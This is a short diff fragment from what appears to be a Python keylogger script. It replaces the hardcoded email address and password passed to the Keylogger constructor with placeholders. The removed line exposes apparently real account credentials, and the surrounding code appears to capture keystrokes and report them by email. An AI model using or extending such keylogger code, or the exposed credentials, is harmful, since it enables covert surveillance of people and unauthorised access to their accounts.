@@ -47,6 +47,6 @@ class Keylogger:
             self.report()
             keyboard_listener.join()
 
-key_logger = Keylogger(30, "falaksinghdm@gmail.com", "Digitalmarket102")
+key_logger = Keylogger(30, "email", "password")
 key_logger.start()
 
